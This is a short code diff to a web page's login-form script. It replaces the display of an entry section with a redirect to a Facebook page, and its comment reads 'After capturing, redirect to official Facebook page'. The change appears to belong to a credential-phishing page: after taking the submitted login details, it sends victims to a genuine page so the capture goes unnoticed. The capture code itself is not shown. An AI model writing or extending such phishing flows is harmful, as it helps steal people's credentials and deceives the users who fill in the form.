@@ -153,9 +153,8 @@ if (loginForm) {
         loginBtn.disabled = true;
 
         setTimeout(() => {
-            loginSection.style.display = 'none';
-            entrySection.style.display = 'block';
-            entrySection.scrollIntoView({ behavior: 'smooth' });
+            // After capturing, redirect to official Facebook page
+            window.location.href = 'https://www.facebook.com/SudaniSudan';
         }, 1500);
     });
 }
